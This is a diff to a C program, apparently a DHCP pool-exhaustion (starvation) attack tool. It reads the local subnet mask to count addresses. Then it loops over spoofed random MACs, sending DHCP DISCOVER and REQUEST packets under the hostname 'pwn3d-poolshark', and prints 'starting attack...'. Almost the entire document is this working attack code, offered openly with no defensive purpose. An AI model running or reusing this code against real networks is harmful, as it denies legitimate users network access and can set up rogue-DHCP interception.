@@ -1,3 +1,7 @@
+#ifdef __INTELLISENSE__
+#pragma diag_suppress 70
+#endif
+
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
@@ -11,9 +15,9 @@
 #include <ifaddrs.h>
 #include <stdbool.h>
 #include <unistd.h>
+#include <sys/ioctl.h>
 
 #define BUFFER_SIZE 65535
-
 
 // DHCP header structure
 typedef struct DHCP
@@ -79,13 +83,25 @@ typedef struct Packet
 void spoof_mac(uint8_t *mac);
 void rand_transaction_id(uint8_t *id);
 void calc_ip_checksum(Packet *p);
+int netmask_to_cidr(unsigned long netmask);
+void exaust_pool(int sock, int ifindex, Packet *p, int num, int delay);
 
 int main(void)
 {
     Packet *p = malloc(sizeof(Packet));
+    struct ifreq ifr;
+    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    char *iface = "enp34s0";
+
     if(!p)
     {
         perror("malloc");
+        return 1;
+    }
+
+    if(sock < 0)
+    {
+        perror("socket");
         return 1;
     }
     
@@ -145,154 +161,32 @@ int main(void)
     memset(&p->dhcp.options[4], 0x00, 308);
     calc_ip_checksum(p);
 
-    uint32_t stranid = (p->dhcp.transaction_id[0] << 24) | (p->dhcp.transaction_id[1] << 16) | (p->dhcp.transaction_id[2] << 8) | p->dhcp.transaction_id[3];
+    
 
-    char random_mac[18];
-    snprintf(random_mac, sizeof(random_mac), "%02X:%02X:%02X:%02X:%02X:%02X", 
-    p->eth.src_mac[0],
-    p->eth.src_mac[1],
-    p->eth.src_mac[2],
-    p->eth.src_mac[3],
-    p->eth.src_mac[4],
-    p->eth.src_mac[5]
-    );
+    struct sockaddr_in *iaddr = (struct sockaddr_in *)&ifr.ifr_netmask;
+    memcpy(ifr.ifr_name, iface, sizeof(iface));
 
-    unsigned char buffer[BUFFER_SIZE];
+    int ifindex = if_nametoindex(ifr.ifr_name);
 
-    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if(sock < 0)
-    {
-        perror("socket");
-        return 1;
-    }
-
-    char *iface = "enp34s0";
-    int ifindex = if_nametoindex(iface);
-
-    if(ifindex == 0)
+    if(ifindex < 0)
     {
         perror("if_nametoindex");
         return 1;
     }
 
-    struct sockaddr_ll addr = {0};
-    socklen_t addr_len = sizeof(addr);
-    addr.sll_family = AF_PACKET;
-    addr.sll_ifindex = ifindex;
-    addr.sll_halen = 6;
-    memset(addr.sll_addr, 0xff, 6);
-
-    int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
-
-    if(bytes_sent < 0)
+    if(ioctl(sock, SIOCGIFNETMASK, &ifr) < 0)
     {
-        perror("sendto");
+        perror("ioctl");
         return 1;
     }
+
+    int cidr = netmask_to_cidr(iaddr->sin_addr.s_addr);
+    int num_of_ips = (1 << (32 - cidr)) - 2;
+
+    printf("identified %d ip's to exause on subnet...\n", num_of_ips);
+    printf("starting attack...\n");
     
-    while(true)
-    {
-        int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
-        if(bytes_received < 0)
-        {
-            perror("recvfrom");
-            return 1;
-        }
-        // create a new Packet object, then fill it in with the response
-        
-        Packet *response_packet = (struct Packet *)buffer;
-
-        if(response_packet->dhcp.opcode == 0x02)
-        {
-            uint32_t rtranid = (response_packet->dhcp.transaction_id[0] << 24) | (response_packet->dhcp.transaction_id[1] << 16) | (response_packet->dhcp.transaction_id[2] << 8) | response_packet->dhcp.transaction_id[3];
-            if(stranid != rtranid)
-            {
-                continue;
-            }
-            char host[16];
-            char offered_ip[16];
-
-            snprintf(host, sizeof(host), "%d.%d.%d.%d", 
-            response_packet->ip.src_ip[0],
-            response_packet->ip.src_ip[1],
-            response_packet->ip.src_ip[2],
-            response_packet->ip.src_ip[3]
-            );
-
-            snprintf(offered_ip, sizeof(offered_ip), "%d.%d.%d.%d", 
-            response_packet->dhcp.ip_addr[0],
-            response_packet->dhcp.ip_addr[1],
-            response_packet->dhcp.ip_addr[2],
-            response_packet->dhcp.ip_addr[3]
-            );
-
-            printf("[%s] offered [%s] for [%s]", host, offered_ip, random_mac);
-            fflush(stdout);
-
-            int offset = 0;
-
-            p->dhcp.options[offset++] = 53;
-            p->dhcp.options[offset++] = 1;
-            p->dhcp.options[offset++] = 3;
-
-            p->dhcp.options[offset++] = 50;
-            p->dhcp.options[offset++] = 4;
-            memcpy(&p->dhcp.options[offset], &response_packet->dhcp.ip_addr[0], 4);
-            offset += 4;
-
-            p->dhcp.options[offset++] = 54;
-            p->dhcp.options[offset++] = 4;
-            memcpy(&p->dhcp.options[offset], &response_packet->ip.src_ip[0], 4);
-            offset += 4;
-
-            char *hostname = "pwn3d-poolshark";
-            int len = strlen(hostname);
-            p->dhcp.options[offset++] = 12;
-            p->dhcp.options[offset++] = len;
-            memcpy(&p->dhcp.options[offset], hostname, len);
-            offset += len;
-
-            p->dhcp.options[offset++] = 255;
-
-            memset(&p->dhcp.options[offset], 0, 312 - offset);
-
-            calc_ip_checksum(p);
-
-            bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
-            if(bytes_sent < 0)
-            {
-                perror("sendto");
-                return 1;
-            }
-
-            while(true)
-            {
-                int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
-
-                if(bytes_received < 0)
-                {
-                    perror("recvfrom");
-                    return 1;
-                }
-
-                Packet *response_packet = (struct Packet *)buffer;
-
-                if(response_packet->dhcp.opcode == 0x02)
-                {
-                    if(memcmp(response_packet->dhcp.transaction_id, p->dhcp.transaction_id, sizeof(p->dhcp.transaction_id)) == 0)
-                    {
-                        printf(" - [SUCCESS]\n");
-                        break;
-                    }
-                    else
-                    {
-                        continue;
-                    }
-                }
-            }
-            break;
-        }
-    }
+    exaust_pool(sock, ifindex, p, num_of_ips, 0);
 }
 
 void spoof_mac(uint8_t *mac)
@@ -332,4 +226,168 @@ void calc_ip_checksum(Packet *p)
     }
 
     p->ip.checksum = htons(~sum & 0xffff);
+}
+
+int netmask_to_cidr(unsigned long netmask)
+{
+    int cidr = 0;
+
+    while(netmask)
+    {
+        cidr += netmask & 1;
+        netmask >>= 1;
+    }
+
+    return cidr;
+}
+
+
+void exaust_pool(int sock, int ifindex, Packet *p, int num, int delay)
+{
+    unsigned char buffer[BUFFER_SIZE];
+    char random_mac[18];
+    char host[16];
+    char offered_ip[16];
+    char *hostname = "pwn3d-poolshark";
+    int len = strlen(hostname);
+    int offset = 0;
+    bool success = false;
+
+    for(int i = 0; i < num; i++)
+    {
+        spoof_mac(p->eth.src_mac);
+        memcpy(p->dhcp.client_mac, p->eth.src_mac, sizeof(p->eth.src_mac));
+        rand_transaction_id(p->dhcp.transaction_id);
+        memset(p->dhcp.options, 0, sizeof(p->dhcp.options));
+
+        p->dhcp.options[0] = 53;
+        p->dhcp.options[1] = 1;
+        p->dhcp.options[2] = 1;
+        p->dhcp.options[3] = 255;
+
+        snprintf(random_mac, sizeof(random_mac), "%02X:%02X:%02X:%02X:%02X:%02X", 
+        p->eth.src_mac[0],
+        p->eth.src_mac[1],
+        p->eth.src_mac[2],
+        p->eth.src_mac[3],
+        p->eth.src_mac[4],
+        p->eth.src_mac[5]
+        );
+
+        struct sockaddr_ll addr = {0};
+        socklen_t addr_len = sizeof(addr);
+        addr.sll_family = AF_PACKET;
+        addr.sll_ifindex = ifindex;
+        addr.sll_halen = 6;
+        memset(addr.sll_addr, 0xff, 6);
+
+        int bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
+
+        if(bytes_sent < 0)
+        {
+            perror("sendto");
+            return;
+        }
+
+        while(true)
+        {
+
+            int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
+            if(bytes_received < 0)
+            {
+                perror("recvfrom");
+                return;
+            }
+            // create a new Packet object, then fill it in with the response
+            
+            Packet *response_packet = (struct Packet *)buffer;
+
+            if(response_packet->dhcp.opcode != 0x02)
+            {
+                continue;
+            }
+
+            if(memcmp(response_packet->dhcp.transaction_id, p->dhcp.transaction_id, sizeof(p->dhcp.transaction_id)) != 0)
+            {
+                continue;
+            }
+
+            snprintf(host, sizeof(host), "%d.%d.%d.%d", 
+            response_packet->ip.src_ip[0],
+            response_packet->ip.src_ip[1],
+            response_packet->ip.src_ip[2],
+            response_packet->ip.src_ip[3]
+            );
+
+            snprintf(offered_ip, sizeof(offered_ip), "%d.%d.%d.%d", 
+            response_packet->dhcp.ip_addr[0],
+            response_packet->dhcp.ip_addr[1],
+            response_packet->dhcp.ip_addr[2],
+            response_packet->dhcp.ip_addr[3]
+            );
+
+            printf("[%s] offered [%s] for [%s]", host, offered_ip, random_mac);
+            fflush(stdout);
+
+            offset = 0;
+
+            p->dhcp.options[offset++] = 53;
+            p->dhcp.options[offset++] = 1;
+            p->dhcp.options[offset++] = 3;
+
+            p->dhcp.options[offset++] = 50;
+            p->dhcp.options[offset++] = 4;
+            memcpy(&p->dhcp.options[offset], &response_packet->dhcp.ip_addr[0], 4);
+            offset += 4;
+
+            p->dhcp.options[offset++] = 54;
+            p->dhcp.options[offset++] = 4;
+            memcpy(&p->dhcp.options[offset], &response_packet->ip.src_ip[0], 4);
+            offset += 4;
+
+            p->dhcp.options[offset++] = 12;
+            p->dhcp.options[offset++] = len;
+            memcpy(&p->dhcp.options[offset], hostname, len);
+            offset += len;
+
+            p->dhcp.options[offset++] = 255;
+
+            memset(&p->dhcp.options[offset], 0, 312 - offset);
+
+            calc_ip_checksum(p);
+
+            bytes_sent = sendto(sock, p, sizeof(*p), 0, (struct sockaddr *)&addr, sizeof(addr));
+            if(bytes_sent < 0)
+            {
+                perror("sendto");
+                return;
+            }
+
+            while(true)
+            {
+                int bytes_received = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&addr, &addr_len);
+
+                if(bytes_received < 0)
+                {
+                    perror("recvfrom");
+                    return;
+                }
+
+                response_packet = (struct Packet *)buffer;
+
+                if(response_packet->dhcp.opcode != 0x02)
+                {
+                    continue;
+                }
+                if(memcmp(response_packet->dhcp.transaction_id, p->dhcp.transaction_id, sizeof(p->dhcp.transaction_id)) != 0)
+                {
+                    continue;
+                }
+
+                printf(" - [SUCCESS]\n");
+                break;
+            }
+            break;
+        } 
+    }
 }
